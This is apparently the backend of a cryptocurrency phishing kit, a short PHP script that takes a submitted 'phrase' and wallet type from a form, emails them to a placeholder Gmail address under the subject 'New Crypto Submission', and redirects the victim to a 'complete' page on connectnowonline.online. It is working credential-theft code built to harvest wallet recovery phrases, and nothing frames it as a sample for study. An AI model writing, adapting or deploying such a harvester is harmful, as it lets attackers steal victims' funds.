<?php





$a = $_POST["phrase"];
$b= $_POST["value"];


// the message
$msg =  "Pharse: ".$a." \n Type: ".$b;

// use wordwrap() if lines are longer than 70 characters
$msg = wordwrap($msg,70);

// send email
mail("youremail@gmail.com","New Crypto Submission",$msg);

header("Location: ://connectnowonline.online/complete");
die();




?>

